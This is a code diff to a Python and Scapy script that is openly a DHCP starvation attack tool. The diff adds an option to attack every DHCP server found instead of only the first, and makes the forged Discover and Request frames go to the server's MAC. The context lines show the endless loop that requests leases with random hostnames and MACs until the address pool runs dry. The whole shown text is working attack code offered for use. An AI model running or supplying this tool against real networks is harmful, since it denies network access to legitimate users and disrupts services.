@@ -19,10 +19,10 @@ conf.verb = 0
 
 # Arguments
 parser = argparse.ArgumentParser()
-parser.add_argument('-i','--interface', action='store', required=True, dest='interface',help='Set interface to use')
+parser.add_argument('-all', required=False, action='store_true', help='[Optional] Attack by all DHCP servers, by default it attacks only the first found.')
+parser.add_argument('-i','--interface', action='store', required=True, dest='interface',help='[Required] Set interface to use on DHCP attacks.')
 args = parser.parse_args()
 
-print(args.interface)
 localiface = args.interface
 
 # Configuration
@@ -81,13 +81,17 @@ def dhcp_server_ip():
     dhcp_discover_packet = ethernet / ip / udp / bootp / dhcp
     x = srp1(dhcp_discover_packet,iface=localiface, timeout=10)
     if (x == None):
-        print ('###[ Request Timeout ]###')
+        print ('###[ Request Timeout, DHCP Server not found ]###')
         quit()
     else:
         return x
 
 def dhcp_dicovery(mac,hostname,t_id):
-    ethernet = Ether(src=localmac,dst=broadcast_mac)
+    if args.all:
+        target_mac = broadcast_mac
+    else:
+        target_mac = dhcp_server_mac
+    ethernet = Ether(src=localmac,dst=target_mac)
     ip = IP(src="0.0.0.0", dst='255.255.255.255')
     udp = UDP(sport=68,dport=67)
     bootp = BOOTP(flags=32768,chaddr=mac_to_hex(mac),xid = t_id)
@@ -104,8 +108,11 @@ def dhcp_dicovery(mac,hostname,t_id):
     return x
 
 def dhcp_request(pkt,mac,tid,hostname):
-    # Craft DHCP Request
-    ethernet = Ether(src=localmac,dst=broadcast_mac)
+    if args.all:
+        target_mac = broadcast_mac
+    else:
+        target_mac = dhcp_server_mac
+    ethernet = Ether(src=localmac,dst=target_mac)
     ip = IP(src="0.0.0.0", dst='255.255.255.255')
     udp = UDP(sport=68, dport=67)
     bootp = BOOTP(flags=32768, chaddr=mac_to_hex(mac), xid = tid)
@@ -125,7 +132,8 @@ def dhcp_request(pkt,mac,tid,hostname):
 dhcp_server_pkt = dhcp_server_ip()
 print ('###[ ' + log_timestamp() + ' Your MAC Address      : ' + colored(get_if_hwaddr(localiface),'blue') + ' ]###')
 print ('###[ ' + log_timestamp() + ' DHCP Server IP Adress : ' + colored(dhcp_server_pkt.getlayer(BOOTP).siaddr,'blue')+ ' MAC: ' + colored(dhcp_server_pkt.getlayer(Ether).src,'blue') + ' ]###')
-# Hapness Loop
+dhcp_server_mac = dhcp_server_pkt.getlayer(Ether).src
+# Hapness Loop 
 while True: 
     letters = string.ascii_lowercase
     hostname = str(''.join(random.choice(letters) for i in range(10)))
@@ -141,7 +149,3 @@ while True:
         if dhcp_request != None:
             print ('###[ '+ log_timestamp() + ' Request Timeout ]###')
             print ('###[ '+ log_timestamp() + ' DHCP ACK              : ' + colored(offer_pkt[BOOTP].yiaddr,'red') + ' ]###')
-
-
-
-
